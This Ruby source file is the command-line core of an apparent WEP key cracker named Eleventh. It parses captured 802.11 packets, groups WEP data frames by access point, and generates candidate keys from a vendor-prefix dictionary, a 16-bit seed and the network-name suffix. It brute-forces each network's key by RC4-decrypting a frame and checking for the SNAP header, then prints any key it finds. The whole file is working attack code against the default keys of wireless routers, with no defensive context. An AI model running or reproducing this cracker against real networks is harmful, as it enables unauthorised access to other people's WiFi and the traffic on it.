require 'eleventh/80211'
require 'eleventh/dictionary'
require 'eleventh/rc4'
require 'terminal-table/import'
require 'pcaprub'
require 'active_support/all'

module Eleventh
  class CLI
    def initialize(filenames)
      @ssids, @data_frames = {}, {}

      filenames.each do |filename|
        begin
          puts "Reading #{File.basename(filename)}..."
          pcap = PCAPRUB::Pcap.open_offline(filename)
          index = 0
          pcap.each do |packet|
            begin
              control_frame = ControlFrame.read(packet)
              case control_frame.type.to_i
                when 2
                  #data
                  next unless control_frame.wep?
                  frame = Frame.read(control_frame.payload.snapshot)
                  wep_frame = WepFrame.read(frame.payload.snapshot)
                  @data_frames[frame.addr2] ||= []
                  @data_frames[frame.addr2] << wep_frame
                when 0
                  case control_frame.subtype.to_i
                    # beacon
                    when 8
                      frame = Frame.read(control_frame.payload.snapshot)
                      management_frame = ManagementFrame.read(frame.payload.snapshot)
                      @ssids[frame.addr2] = management_frame.ssid unless management_frame.ssid.blank?
                  end
              end
              puts "Processed #{index} packets so far" if (index += 1) % 1000 == 0
            rescue => e
              puts "ERROR: #{e}"
            rescue Interrupt
              break
            end
          end
        rescue => e
          puts "ERROR: #{e}"
        end
      end

      network_table = table do |t|
        t.headings = ["BSSID", "ESSID", "Data Packets"]
        @ssids.reject { |bssid| @data_frames[bssid].nil? }.sort_by{|bssid, essid| essid}.each do |bssid, essid|
          t.add_row [bssid, essid, @data_frames[bssid].size]
        end
      end

      puts network_table

      puts "#{@data_frames.size} vulnerable networks found."
      @data_frames.each do |bssid, frames|
        begin
          ssid = @ssids[bssid] || bssid.to_s
          bruteforce(ssid, bssid, frames)
        rescue Interrupt
          next
        end
      end
    end

    protected

    SNAP_FRAME_HEADER = "\xAA\xAA\x03\x00\x00\x00"

    def bruteforce(ssid, bssid, frames)
      keys = keygen(ssid, bssid)

      return unless keys.any?

      puts "Cracking #{ssid} [#{bssid}] (#{frames.size} data frames found)"
      puts "  #{keys.size} possible known keys to test against."

      frame = frames.first
      iv_string = frame.iv.to_binary_s
      snap_data = frame.data.to_binary_s.to(SNAP_FRAME_HEADER.size-1)

      start_time = Time.now.to_f
      keys.each do |key|
        if decrypt(snap_data, key, iv_string).start_with?(SNAP_FRAME_HEADER)
          end_time = "%0.2f" % (Time.now.to_f - start_time)
          puts "  Key found: #{key} (#{end_time}s)"
          return key
        end
      end
    end

    def decrypt(data, key, iv)
      rc4 = RC4.new(iv + key)
      rc4.process(data)
    end

    def keygen(essid, bssid)
      suffix = essid[-2, 2]
      if prefixes = DICTIONARY[bssid.to_s.to(7)]
        prefixes.map { |prefix| (0..65535).map { |seed| [prefix, seed.to_s(16).rjust(4, "0").upcase, suffix].join } }.flatten
      else
        []
      end
    end
  end
end